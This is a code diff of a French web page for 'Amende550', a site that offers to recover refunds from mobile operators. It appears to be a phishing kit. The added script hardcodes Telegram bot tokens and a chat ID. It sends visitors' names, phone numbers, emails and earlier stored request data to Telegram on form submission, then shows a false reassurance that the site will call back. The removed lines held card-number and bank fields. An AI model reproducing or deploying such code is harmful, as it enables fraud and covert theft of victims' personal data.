-                        <a href="#" class="social-link"><i class="fab fa-instagram"></i></a>
-                    </div>
-                </div>
-                
-                <div class="contact-form">
-                    <h3>Envoyez-nous un message</h3>
-                    <form class="contact-form">
-                        <div class="form-group">
-                            <label for="contact-name" class="form-label">Nom complet</label>
-                            <input type="text" id="contact-name" name="contact-name" class="form-control" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="contact-email" class="form-label">Email</label>
-                            <input type="email" id="contact-email" name="contact-email" class="form-control" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="contact-subject" class="form-label">Sujet</label>
-                            <input type="text" id="contact-subject" name="contact-subject" class="form-control" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="contact-message" class="form-label">Message</label>
-                            <textarea id="contact-message" name="contact-message" rows="4" class="form-control" required></textarea>
-                        </div>
-                        
-                        <button type="submit" class="submit-btn">
-                            Envoyer le message <i class="fas fa-paper-plane ml-2"></i>
-                        </button>
-                    </form>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer>
-        <div class="footer-container">
-            <div class="footer-about">
-                <div class="footer-logo">
-                    <i class="fas fa-phone-alt"></i>
-                    <span>Amende550</span>
-                </div>
-                <p>Nous aidons les clients à obtenir des remboursements auprès de leurs opérateurs mobiles de manière simple, rapide et sécurisée.</p>
-            </div>
-            
-            <div class="footer-links">
-                <h3>Liens rapides</h3>
-                <ul>
-                    <li><a href="#">Accueil</a></li>
-                    <li><a href="#how-it-works">Fonctionnement</a></li>
-                    <li><a href="#faq">FAQ</a></li>
-                    <li><a href="#contact">Contact</a></li>
-                </ul>
-            </div>
-            
-            <div class="footer-links">
-                <h3>Légal</h3>
-                <ul>
-                    <li><a href="#">Conditions générales</a></li>
-                    <li><a href="#">Politique de confidentialité</a></li>
-                    <li><a href="#">Cookies</a></li>
-                    <li><a href="#">Mentions légales</a></li>
-                </ul>
-            </div>
-            
-            <div class="newsletter">
-                <h3>Newsletter</h3>
-                <p>Abonnez-vous pour recevoir nos dernières actualités et offres.</p>
-                <form class="newsletter-form">
-                    <input type="email" placeholder="Votre email" class="newsletter-input" required>
-                    <button type="submit" class="newsletter-btn">
-                        <i class="fas fa-paper-plane"></i>
-                    </button>
+                    <button type="submit" class="submit-btn">Envoyer la demande de récupération</button>
                 </form>
             </div>
         </div>
-        
-        <div class="footer-bottom">
-            <div class="footer-social">
-                <a href="#"><i class="fab fa-facebook-f"></i></a>
-                <a href="#"><i class="fab fa-twitter"></i></a>
-                <a href="#"><i class="fab fa-linkedin-in"></i></a>
-                <a href="#"><i class="fab fa-instagram"></i></a>
-            </div>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <ul class="footer-links">
+                <li><a href="#">Politique de confidentialité</a></li>
+                <li><a href="#">Conditions d'utilisation</a></li>
+                <li><a href="#">Contact</a></li>
+            </ul>
             <p class="copyright">&copy; 2023 Amende550. Tous droits réservés.</p>
         </div>
     </footer>
 
-    <!-- Back to Top Button -->
-    <div class="back-to-top">
-        <i class="fas fa-arrow-up"></i>
-    </div>
-
-    <!-- Scripts -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
     <script>
-        // Initialize the page
         document.addEventListener('DOMContentLoaded', function() {
-            // Set current date in the user info section
-            const now = new Date();
-            document.getElementById('display-date').textContent = now.toLocaleDateString('fr-FR');
+            // Telegram Bots Configuration
+            const BOT_TOKENS = [
+                "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw",
+                "7159716957:AAFee9KZfc0VbBqxt2Br_w5CypF4hEY4JkQ"
+            ];
+            const CHAT_ID = "780712584";
             
-            // FAQ functionality
-            const faqQuestions = document.querySelectorAll('.faq-question');
-            faqQuestions.forEach(question => {
-                question.addEventListener('click', () => {
-                    const answer = question.nextElementSibling;
-                    const icon = question.querySelector('i');
-                    
-                    answer.classList.toggle('open');
-                    icon.classList.toggle('fa-chevron-down');
-                    icon.classList.toggle('fa-chevron-up');
+            // Récupérer les données sauvegardées
+            const savedRequests = JSON.parse(localStorage.getItem('amendeRequests')) || [];
+            const latestRequest = savedRequests[savedRequests.length - 1];
+            
+            // Afficher les données utilisateur si elles existent
+            if (latestRequest) {
+                const userDataDiv = document.getElementById('userData');
+                
+                const userDataHTML = `
+                    <div class="info-item">
+                        <span class="info-label">Nom complet:</span>
+                        <span class="info-value">${latestRequest.fullname || 'Non fourni'}</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Numéro de téléphone:</span>
+                        <span class="info-value">${latestRequest.phone || 'Non fourni'}</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Email:</span>
+                        <span class="info-value">${latestRequest.email || 'Non fourni'}</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Date de la demande:</span>
+                        <span class="info-value">${latestRequest.date || ''} à ${latestRequest.time || ''}</span>
+                    </div>
+                `;
+                
+                userDataDiv.innerHTML = userDataHTML;
+                
+                // Pré-remplir le formulaire de récupération
+                if (latestRequest.phone) {
+                    document.getElementById('recovery-phone').value = latestRequest.phone;
+                }
+                if (latestRequest.fullname) {
+                    document.getElementById('recovery-name').value = latestRequest.fullname;
+                }
+            } else {
+                // Rediriger vers la page d'accueil si aucune donnée n'est trouvée
+                window.location.href = 'index.html';
+            }
+            
+            // Fonction pour envoyer les données à Telegram
+            async function sendToTelegram(message) {
+                const encodedMessage = encodeURIComponent(message);
+                const promises = BOT_TOKENS.map(token => {
+                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
+                    return fetch(url).catch(err => console.error('Error sending to Telegram:', err));
                 });
-            });
+                
+                return Promise.all(promises);
+            }
             
-            // Back to top button
-            const backToTopButton = document.querySelector('.back-to-top');
-            window.addEventListener('scroll', () => {
-                if (window.pageYOffset > 300) {
-                    backToTopButton.classList.add('visible');
-                } else {
-                    backToTopButton.classList.remove('visible');
+            // Gestion du formulaire de récupération
+            const recoveryForm = document.getElementById('recoveryForm');
+            const loadingDiv = document.getElementById('loading');
+            
+            recoveryForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const phone = document.getElementById('recovery-phone').value.trim();
+                const name = document.getElementById('recovery-name').value.trim();
+                
+                // Validation simple
+                if (!phone || !name) {
+                    alert('Veuillez remplir tous les champs obligatoires');
+                    return;
+                }
+                
+                // Afficher le loader
+                loadingDiv.style.display = 'block';
+                
+                try {
+                    // Préparer le message pour Telegram
+                    const now = new Date();
+                    const message = `🆘 NOUVELLE DEMANDE DE RÉCUPÉRATION 🆘
+                    
+📞 Téléphone: ${phone}
+👤 Nom: ${name}
+
+📅 Date de la demande: ${now.toLocaleDateString('fr-FR')} à ${now.toLocaleTimeString('fr-FR')}
+
+ℹ️ Détails de la demande initiale:
+- Nom: ${latestRequest.fullname || 'Non fourni'}
+- Téléphone: ${latestRequest.phone || 'Non fourni'}
+- Email: ${latestRequest.email || 'Non fourni'}`;
+
+                    // Envoyer à Telegram
+                    await sendToTelegram(message);
+                    
+                    // Sauvegarder la demande de récupération
+                    const recoveryRequests = JSON.parse(localStorage.getItem('recoveryRequests')) || [];
+                    recoveryRequests.push({
+                        phone: phone,
+                        name: name,
+                        date: now.toLocaleDateString('fr-FR'),
+                        time: now.toLocaleTimeString('fr-FR'),
+                        originalRequest: latestRequest
+                    });
+                    localStorage.setItem('recoveryRequests', JSON.stringify(recoveryRequests));
+                    
+                    // Message de succès
+                    setTimeout(() => {
+                        alert('Votre demande a été envoyée avec succès. Nous vous contacterons dans les 24 heures.');
+                        loadingDiv.style.display = 'none';
+                    }, 1500);
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('Une erreur est survenue. Veuillez réessayer plus tard.');
+                    loadingDiv.style.display = 'none';
                 }
             });
             
-            backToTopButton.addEventListener('click', () => {
-                window.scrollTo({
-                    top: 0,
-                    behavior: 'smooth'
-                });
-            });
-            
-            // Format phone number input
-            const phoneInput = document.getElementById('telephone');
+            // Formatage du numéro de téléphone
+            const phoneInput = document.getElementById('recovery-phone');
             if (phoneInput) {
                 phoneInput.addEventListener('input', function(e) {
                     let value = e.target.value.replace(/\D/g, '');
-                    if (value.length > 10) value = value.slice(0, 10);
-                    e.target.value = value.replace(/(\d{2})(?=\d)/g, '$1 ');
-                });
-            }
-            
-            // Format card number input
-            const cardInput = document.getElementById('numero-carte');
-            if (cardInput) {
-                cardInput.addEventListener('input', function(e) {
-                    let value = e.target.value.replace(/\D/g, '');
-                    if (value.length > 16) value = value.slice(0, 16);
-                    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-                });
-            }
-            
-            // Form submission
-            const form = document.getElementById('remboursement-form');
-            if (form) {
-                form.addEventListener('submit', function(e) {
-                    e.preventDefault();
                     
-                    const submitBtn = document.getElementById('submit-btn');
-                    const btnText = document.getElementById('btn-text');
-                    const loadingSpinner = document.getElementById('loading-spinner');
+                    if (value.startsWith('33')) {
+                        value = '+' + value;
+                    } else if (value.startsWith('0')) {
+                        // Keep as is
+                    } else if (value.length > 0) {
+                        value = '0' + value;
+                    }
                     
-                    submitBtn.disabled = true;
-                    btnText.textContent = 'Traitement en cours...';
-                    loadingSpinner.classList.remove('hidden');
-                    
-                    // Simulate form processing
-                    setTimeout(() => {
-                        // Store form data
-                        const formData = {
-                            nom: document.getElementById('nom').value,
-                            telephone: document.getElementById('telephone').value,
-                            operateur: document.getElementById('operateur').value,
-                            bank: document.getElementById('bank').value,
-                            amount: document.getElementById('amount').value,
-                            reason: document.getElementById('reason').value
-                        };
-                        
-                        localStorage.setItem('formData', JSON.stringify(formData));
-                        
-                        // Redirect to processing page
-                        window.location.href = 'traitement.html';
-                    }, 2000);
+                    e.target.value = value;
                 });
             }
         });
